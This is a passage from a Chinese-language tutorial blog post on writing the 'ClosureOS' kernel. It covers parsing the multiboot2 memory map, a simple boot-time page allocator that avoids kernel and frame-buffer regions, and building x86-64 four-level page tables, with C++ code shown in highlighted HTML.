class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_tag</span> *tag;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_tag_mmap</span> *mmap_tag = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">int</span> mmap_entry_nr;<br><br>    <span class="hljs-keyword">for</span> (tag = (<span class="hljs-keyword">struct</span> multiboot_tag *) (mbi + <span class="hljs-number">8</span>);<br>         tag-&gt;type != MULTIBOOT_TAG_TYPE_END;<br>         tag = (<span class="hljs-keyword">struct</span> multiboot_tag *)<br>                 ((<span class="hljs-type">multiboot_uint8_t</span> *) tag + ((tag-&gt;size + <span class="hljs-number">7</span>) &amp; ~<span class="hljs-number">7</span>))) &#123;<br>        <span class="hljs-keyword">if</span> (tag-&gt;type == MULTIBOOT_TAG_TYPE_MMAP) &#123;<br>            mmap_tag = (<span class="hljs-keyword">struct</span> multiboot_tag_mmap*) tag;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!mmap_tag) &#123;<br>        <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] Unable to find mmap tag in multiboot info! Halting...&quot;</span>);<br>        <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot; hlt; &quot;</span>)</span></span>;<br>    &#125;<br><br>    mmap_entry_nr = (mmap_tag-&gt;size - <span class="hljs-built_in">sizeof</span>(*mmap_tag)) / <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> multiboot_mmap_entry);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; mmap_entry_nr; i++) &#123;<br>        <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;[*] Memory region &quot;</span>);<br>        <span class="hljs-built_in">boot_printnum</span>(i);<br>        <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;, addr: 0x&quot;</span>);<br>        <span class="hljs-built_in">boot_printhex</span>(mmap_tag-&gt;entries[i].addr);<br>        <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;, size: 0x&quot;</span>);<br>        <span class="hljs-built_in">boot_printhex</span>(mmap_tag-&gt;entries[i].len);<br>        <span class="hljs-built_in">boot_printstr</span>(<span class="hljs-string">&quot;, type: &quot;</span>);<br>        <span class="hljs-built_in">boot_printnum</span>(mmap_tag-&gt;entries[i].type);<br>        <span class="hljs-built_in">boot_putchar</span>(<span class="hljs-string">&#x27;\n&#x27;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到我们有不少内存段，但其中绝大部分都是不可作为内存使用的保留段（<code>type ==2</code>），我们能用来作为内存使用的只有 <code>type==1</code> 的段：</p><blockquote><p>这些保留段包括 MMIO 区域等</p></blockquote><p><img src="https://s2.loli.net/2024/06/16/PogROmLe2KjQwi3.png"></p><p>现在让我们正式开始编写与内存管理相关的代码，类似于内核需要分步装载（boot loader 到 kernel），我们的内存管理器同样采用 <strong>分步走</strong> 的设计思路：</p><ul><li>先创建一个最基本的内存管理器，由其分配正式的内存管理器所需的内存，再启用正式的内存管理器</li></ul><p>这个内存分配器的作用 <strong>仅</strong> 是为我们接下来创建正式的内存管理器进行内存分配，因此我们 <strong>不需要考虑释放内存的情况，直接线性地分配可用内存空间即可</strong> ，为了简化此阶段的内存分配模型，这里我们限定每次分配的内存大小为单张内存页：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_tag_mmap</span> *mmap_tag = <span class="hljs-literal">nullptr</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">uint32_t</span> mmap_entry_nr;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_mmap_entry</span> *curr_entry = <span class="hljs-literal">nullptr</span>;<br><span class="hljs-type">int</span> curr_entry_idx = <span class="hljs-number">-1</span>;<br>mm::<span class="hljs-type">phys_addr_t</span> curr_avail, curr_end;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Linear allocator without releasing, alloc a page each time.</span><br><span class="hljs-comment"> * Note that the result could be physical 0, NULL should not be use as failure,</span><br><span class="hljs-comment"> * but a -EMOMEM or some other error number should be returned.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_page_alloc_internal</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">void</span>*</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *res;<br><br>    <span class="hljs-comment">/* initialization */</span><br>    <span class="hljs-keyword">if</span> (!curr_entry) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = (curr_entry_idx + <span class="hljs-number">1</span>); i &lt; mmap_entry_nr; i++) &#123;<br>            <span class="hljs-keyword">if</span> (mmap_tag-&gt;entries[i].type == MULTIBOOT_MEMORY_AVAILABLE) &#123;<br>                mm::<span class="hljs-type">phys_addr_t</span> base = mmap_tag-&gt;entries[i].addr;<br>                mm::<span class="hljs-type">phys_addr_t</span> end = base + mmap_tag-&gt;entries[i].len;<br><br>                <span class="hljs-keyword">if</span> (base &gt; end) &#123;<br>                    <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] FATAL ERROR: &quot;</span><br>                              <span class="hljs-string">&quot;integeter overflow at parsing multiboot tags&quot;</span>);<br>                    <span class="hljs-function"><span class="hljs-keyword">asm</span> <span class="hljs-title">volatile</span> <span class="hljs-params">(<span class="hljs-string">&quot; hlt; &quot;</span>)</span></span>;<br>                &#125;<br><br>                <span class="hljs-comment">/**</span><br><span class="hljs-comment">                 * we&#x27;d like to give up the first and last partial page,</span><br><span class="hljs-comment">                 * as it&#x27;s not enough for use to use</span><br><span class="hljs-comment">                */</span><br>                base = <span class="hljs-built_in">PAGE_ALIGN</span>(base);<br>                end &amp;= PAGE_MASK;<br>                <br>                <span class="hljs-comment">/* available region may be less than 1 page, ignore */</span><br>                <span class="hljs-keyword">if</span> ((end &lt; base) || ((end - base) &lt; PAGE_SIZE)) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br><br>                curr_avail = base;<br>                curr_end = end;<br>                curr_entry = &amp;mmap_tag-&gt;entries[i];<br>                curr_entry_idx = i;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!curr_entry) &#123;<br>        <span class="hljs-built_in">boot_puts</span>(<span class="hljs-string">&quot;[x] FATAL ERROR: NO MEMORY AVAILABLE!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ERR_PTR</span>(-ENOMEM);<br>    &#125;<br><br>    res = (<span class="hljs-type">void</span>*) curr_avail;<br>    curr_avail += PAGE_SIZE;<br><br>    <span class="hljs-keyword">if</span> (curr_avail == curr_end) &#123;<br>        curr_entry = <span class="hljs-literal">nullptr</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的一点是， <strong>我们的内核本体便位于可用内存区域</strong> ，因此在进行内存分配时我们应当跳过这些区域，得益于 Multiboot 规范的存在， boot loader 会向我们提供一个如下格式的 tag 来存放 ELF 各节的信息：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u32     |<span class="hljs-string"> type = 9          </span>|<br>u32     |<span class="hljs-string"> size              </span>|<br>u16     |<span class="hljs-string"> num               </span>|<br>u16     |<span class="hljs-string"> entsize           </span>|<br>u16     |<span class="hljs-string"> shndx             </span>|<br>u16     |<span class="hljs-string"> reserved          </span>|<br>varies  |<span class="hljs-string"> section headers   </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure><p>ELF 格式是 *nix 系统中常用的可执行程序的格式，也是我们的 ClosureOS kernel 文件的格式，简单理解可以认为其由一个 ELF header 存储总的信息，由一个 header table 存储不同 section 的信息，简而言之一个 ELF 文件应当长这个样子：</p><p><img src="https://i.loli.net/2021/06/03/boZ8nCURBOXfdQH.png" alt="ELF 格式提供了两种基本视图：链接视图与执行视图，区别大概就是链接后会把相同的段整合在一起"></p><p>更加详细的细节笔者就不赘叙了，感兴趣的可以自行参考 <a href="https://refspecs.linuxfoundation.org/elf/elf.pdf">Linux Foundation - Executable and Linking Format (ELF) Specification</a> ，这里我们简单介绍一下 section header 的格式，multiboot2 elf tag 提供给我们的 section headers 和 ELF 中的 section header table 是一样的，都是一个如下所示结构体的数组，不同的是 <code>sh_offset</code> 段被 GRUB 填上其相对于 ELF 加载起始地址的偏移（在上一篇文章中，我们在链接脚本中将这个起始地址设为 <code>1M</code> ）：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">elf64_shdr</span> &#123;<br>    elf64_word  sh_name;<br>    elf64_word  sh_type;<br>    elf64_xword sh_flags;<br>    elf64_addr  sh_addr;<br>    elf64_off   sh_offset;<br>    elf64_xword sh_size;<br>    elf64_word  sh_link;<br>    elf64_word  sh_info;<br>    elf64_xword sh_addr_align;<br>    elf64_xword sh_ent_size;<br>&#125;;<br></code></pre></td></tr></table></figure><blockquote><p>至于为什么是 section header 而不是 program header，总之 multiboot2 specification 就是这么定义的…</p></blockquote><p>这里我们简单写一个 wrapper 在每次进行内存分配之后将地址与 ELF tag 中各 section 的地址范围进行对比，若刚好位于 ELF 范围则重新进行内存分配，这里我们仅考虑 <code>shdr-&gt;sh_type == SHT_PROGBITS</code> 的情况，因为 <code>.text</code> 等段都是这个类型，其他的一些例如 <code>.symtab</code> 等段对于我们程序运行而言其实并不重要；此外我们仅考虑 <code>shdr-&gt;sh_flags</code> 包含 <code>SHF_ALLOC</code> 的情况，只有存在该标志位才表示这个段在运行时需要内存</p><blockquote><p>至于 <code>.bss</code> 段，我们所获得的类型为 <code>shdr-&gt;sh_type == SHT_NOBITS</code> ，因为这个段的数据全为 0，所以在这里我们可以暂时忽略，等到后续重建高端内核内存映射时再分配这个段的空间</p></blockquote><p>此外，我们还需要避免覆写掉 multiboot tags 所在的区域以及 frame buffer 所在区域：</p><blockquote><p>实际上，frame buffer 的内存区域通常并不直接来自 RAM，而是来自显卡，不过保险起见这里多加一份检查</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">multiboot_tag_elf_sections</span> *elf_info_tag = <span class="hljs-literal">nullptr</span>;<br>mm::<span class="hljs-type">phys_addr_t</span> multiboot_tag_start, multiboot_tag_end;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">addr_is_in_used_range</span><span class="hljs-params">(mm::<span class="hljs-type">phys_addr_t</span> addr)</span> -&gt; <span class="hljs-type">bool</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">elf64_shdr</span> *shdr;<br>    <span class="hljs-type">void</span> *shdr_end;<br>    mm::<span class="hljs-type">phys_addr_t</span> seg_start, seg_end;<br><br>    <span class="hljs-comment">/* in ELF range */</span><br>    shdr_end = (<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) &amp;elf_info_tag-&gt;sections<br>               + elf_info_tag-&gt;num * <span class="hljs-built_in">sizeof</span>(*shdr));<br><br>    <span class="hljs-keyword">for</span> (shdr = (elf64_shdr*) &amp;elf_info_tag-&gt;sections;<br>         (<span class="hljs-type">void</span>*) shdr &lt; shdr_end;<br>         shdr = (elf64_shdr*) ((mm::<span class="hljs-type">phys_addr_t</span>) shdr + <span class="hljs-built_in">sizeof</span>(*shdr))) &#123;<br><br>        <span class="hljs-keyword">if</span> ((shdr-&gt;sh_type != SHT_PROGBITS)<br>            || !(shdr-&gt;sh_flags &amp; SHF_ALLOC)) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        seg_start = <span class="hljs-number">0x100000</span> + shdr-&gt;sh_offset;<br>        seg_end = <span class="hljs-built_in">PAGE_ALIGN</span>(seg_start + shdr-&gt;sh_size);<br><br>        <span class="hljs-keyword">if</span> (addr &gt;= seg_start &amp;&amp; addr &lt; seg_end) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* in frame buffer */</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">boot_tty_has_fb</span>()) &#123;<br>        <span class="hljs-keyword">if</span> ((addr &gt;= (mm::<span class="hljs-type">phys_addr_t</span>) boot_fb_base)<br>            &amp;&amp; (addr &lt;= (mm::<span class="hljs-type">phys_addr_t</span>) boot_fb_end)) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* in multiboot tags */</span><br>    <span class="hljs-keyword">if</span> ((addr &gt;= multiboot_tag_start) &amp;&amp; (addr &lt;= multiboot_tag_end)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="页表重建立"><a href="#页表重建立" class="headerlink" title="页表重建立"></a>页表重建立</h2><p>有了临时的动态内存分配器，现在我们可以开始 <strong>建立一个常规的四级页表，并将内核本体对应的物理内存映射到高端内存空间</strong> ，完成这一部分的初始化工作之后我们的后续工作都将在高半部内核完成</p><p>首先是页表映射的建立，页表主要用于将由页表所定义的虚拟地址空间映射到物理地址空间上，在 CPU 进行内存访问时内存管理单元（Memory Management Unit）会根据页表将虚拟地址翻译（translate）成物理地址，在纯 64 位模式下虚拟地址的最大长度为 8 字节，在兼容模式下虚拟地址仅能用前 4 字节，且需要额外经历基于分段的翻译， <strong>我们的 ClosureOS 为纯 64 位系统，暂时不考虑 32 位的情况</strong> ：</p><blockquote><p>注： <em>本章</em> 暂时不考虑 <em>翻译后备缓冲区</em> （Translation Lookaside Buffer），感兴趣的同学可以先自行了解</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129170947.png" alt="amd64 下的页表翻译过程"></p><p>64 位下最常用的是 4 级页表结构，页顶级表的地址被存放在 CR3 寄存器中，通常情况下一张内存页被设定为 4KB，单条页表项的长度为 8 字节：</p><ul><li>对于虚拟地址而言，前 12 位被用来表示内存页内的偏移；对于页表项而言，前 12 位用于存放页权限等信息</li><li>剩下的 36 位每 9 位用来表示在页表不同级别的偏移，开启 5 级分页后额外多用 9 位表示第 5 级的偏移，否则作为保留位</li><li>剩下 7 位用作扩展</li></ul><p><img src="https://s2.loli.net/2024/06/20/SvC9YmyWuphJosO.png" alt="4 级页表结构，来自 AMD64 Architecture Programmer&#39;s Manual Volume 2"></p><p>纯 64 位模式下，4K 页的页表项结构如下：</p><p><img src="https://s2.loli.net/2024/06/20/QoBCNTfJPAzwvxr.png"></p><p>前 12 位的各位说明如下：</p><ul><li><strong>AVL</strong>：available，该页是否可用，可忽略</li><li><strong>G</strong>：是否为<strong>全局页</strong>，全局页会被保存在 TLB 中方便调用；1为是</li><li><strong>PAT</strong>：页属性表位，用以在分级页表中设定页的属性，这里暂且先置0</li><li><strong>D</strong>：Dirty，当一张内存页被写入时，CPU会将该页<strong>标脏</strong>，仅针对页表项有效</li><li><strong>A</strong>：Accessed，该页每次被访问时该位都会被置1，定期清零，置1次数用以表示使用频率</li><li><strong>PCD</strong>：Page-level Cache Disable，0 为启用高速缓存，1 为禁止</li><li><strong>PWT</strong>：Page-level Write-Through，页级通写位，与高速缓存有关，这里暂且置 0</li><li><strong>US</strong>：User&#x2F;Supervisor，权限位，1 时 ring0~ring3 均可访问该页，0时仅 ring0~ring2 可访问（一般来说操作系统只需要用到 ring0 与 ring3）</li><li><strong>RW</strong>：即 Read&#x2F;Write，该位为 1 时该页可读写，否则只可读不可写</li><li><strong>P</strong>：Present，即该页是否存在，0 表示该页不存在于物理页中，此时对该页的访问会引发缺页异常</li></ul><p>我们的 ClosureOS 使用的是常规的 4 级页表与 4KB 页大小，因为这更适合我们对不同的内存区域进行更加细粒度的映射管理，对于页表的映射建立操作，我们只需要直接分配各级页表项的空间后写入即可，这里需要注意的是 <strong>高级页目录表项权限会限制低级页表项的权限，因此对于存在映射的虚拟内存区域，除了最后一级页表项以外的页目录表项我们都应当给予可写的权限</strong> ：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PDE_DEFAULT     (PDE_ATTR_P | PDE_ATTR_RW)</span><br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_pgtable_map</span><span class="hljs-params">(mm::<span class="hljs-type">phys_addr_t</span> pgtable,</span></span><br><span class="hljs-params"><span class="hljs-function">                                mm::<span class="hljs-type">virt_addr_t</span> va,</span></span><br><span class="hljs-params"><span class="hljs-function">                                mm::<span class="hljs-type">phys_addr_t</span> pa, </span></span><br><span class="hljs-params"><span class="hljs-function">                                mm::<span class="hljs-type">page_attr_t</span> attr)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">pgd_t</span> *pgd;<br>    <span class="hljs-type">pud_t</span> *pud;<br>    <span class="hljs-type">pmd_t</span> *pmd;<br>    <span class="hljs-type">pte_t</span> *pte;<br>    <span class="hljs-type">int</span> pgd_i = <span class="hljs-built_in">PGD_ENTRY</span>(va);<br>    <span class="hljs-type">int</span> pud_i = <span class="hljs-built_in">PUD_ENTRY</span>(va);<br>    <span class="hljs-type">int</span> pmd_i = <span class="hljs-built_in">PMD_ENTRY</span>(va);<br>    <span class="hljs-type">int</span> pte_i = <span class="hljs-built_in">PTE_ENTRY</span>(va);<br><br>    pgd = (<span class="hljs-type">pgd_t</span>*) pgtable;<br>    <span class="hljs-keyword">if</span> (!pgd[pgd_i]) &#123;<br>        pgd[pgd_i] = (<span class="hljs-type">pgd_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) pgd[pgd_i])) &#123;<br>            pgd[pgd_i] = (<span class="hljs-type">pgd_t</span>) <span class="hljs-literal">nullptr</span>;<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) pgd[pgd_i]), <span class="hljs-number">0</span> ,PAGE_SIZE);<br>        pgd[pgd_i] |= PDE_DEFAULT;<br>    &#125;<br><br>    pud = (<span class="hljs-type">pud_t</span>*) (pgd[pgd_i] &amp; PAGE_MASK);<br>    <span class="hljs-keyword">if</span> (!pud[pud_i]) &#123;<br>        pud[pud_i] = (<span class="hljs-type">pud_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) pud[pud_i])) &#123;<br>            pud[pud_i] = (<span class="hljs-type">pud_t</span>) <span class="hljs-literal">nullptr</span>;<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) pud[pud_i]), <span class="hljs-number">0</span> ,PAGE_SIZE);<br>        pud[pud_i] |= PDE_DEFAULT;<br>    &#125;<br><br>    pmd = (<span class="hljs-type">pmd_t</span>*) (pud[pud_i] &amp; PAGE_MASK);<br>    <span class="hljs-keyword">if</span> (!pmd[pmd_i]) &#123;<br>        pmd[pmd_i] = (<span class="hljs-type">pmd_t</span>) <span class="hljs-built_in">boot_mm_page_alloc</span>();<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">IS_ERR_PTR</span>((<span class="hljs-type">void</span>*) pmd[pmd_i])) &#123;<br>            pmd[pmd_i] = (<span class="hljs-type">pmd_t</span>) <span class="hljs-literal">nullptr</span>;<br>            <span class="hljs-keyword">return</span> -ENOMEM;<br>        &#125;<br><br>        <span class="hljs-built_in">boot_memset</span>((<span class="hljs-type">void</span>*) ((mm::<span class="hljs-type">phys_addr_t</span>) pmd[pmd_i]), <span class="hljs-number">0</span> ,PAGE_SIZE);<br>        pmd[pmd_i] |= PDE_DEFAULT;<br>    &#125;<br><br>    pte = (<span class="hljs-type">pte_t</span>*) (pmd[pmd_i] &amp; PAGE_MASK);<br>    pte[pte_i] = pa | attr;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们可以开始重新建立新的页表映射了，我们首先映射这几个区域：</p><ul><li><p>内核 ELF，用于正常执行代码</p></li><li><p>内存直接映射区，映射整个已知的物理内存空间，用于直接访问物理内存以及后续的内核小对象内存分配器</p></li><li><p>此外，对于存在 frame buffer 的情况，我们还需要映射 frame buffer 所在内存</p></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> <span class="hljs-title">boot_mm_pgtable_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> -&gt; <span class="hljs-type">int</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">elf64_shdr</span> *shdr;<br>    <span class="hljs-type">void</span> *shdr_end;<br>    mm::<span class="hljs-type">phys_addr_t</span> seg_phys_start, seg_phys_end;<br>    mm::<span class="hljs-type">virt_addr_t</span> seg_virt_start, seg_virt_end;<br>    mm::<span class="hljs-type">page_attr_t</span> pte_attr;<br>    mm::<span class="hljs-type">phys_addr_t</span> physmem_start, 